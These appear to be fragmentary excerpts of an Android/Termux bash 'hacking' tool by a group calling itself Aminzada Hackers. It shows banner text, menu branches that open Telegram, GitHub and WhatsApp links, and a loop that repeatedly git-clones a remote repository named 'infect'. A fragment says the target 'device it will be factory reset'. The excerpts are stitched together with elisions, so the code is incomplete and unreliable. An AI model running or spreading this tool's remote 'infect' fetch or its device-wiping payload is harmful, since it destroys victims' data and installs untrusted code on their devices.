# A tool by nitro from https://t.me/BLACK_Hackers_Team_919
...
'
echo " " 
echo -e "$red                       ▶Coded by$grn Aminzada$red◀$rset"
echo -e "$red                      ⫸$ylo  Aminzada Hackers$red ⫷$rset"
echo 
# Functions
...
then
am start -a android.intent.action.VIEW -d https://t.me/BLACK_Hackers_Team_919> /dev/null 2>&1
banner
menu
elif [ $optnz = "6" ];
then
am start -a android.intent.action.VIEW -d https://github.com/Aminzada_hackers > /dev/null 2>&1
banner
menu
elif [ $optnz = "7" ];
then
am start -a android.intent.action.VIEW -d  https://wa.link/9we3dt> /dev/null 2>&1
banner
menu
elif [ $optnz = "8" ];
then
...
device it will be factory reset and lot more happens Maked by Aminzada 
                                👇👇👇
...
echo -e "\e[93m             IAM FROM \e[92mAMINZADA HACKERS" | pv -qL 10
...
echo -e "\e[93m        MY WEBSITE:\e[92m www.aminzada_hackers.com\e[0m" | pv -qL 10
...
while git clone https://github.com/Aminzada_hackers/infect 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
...
if [ "$p" = "y" ];
then
am start -a android.intent.action.VIEW -d https://wa.link/9we3dt 2>/dev/null
clear
baner1
menu
elif [ "$p" = "t" ];
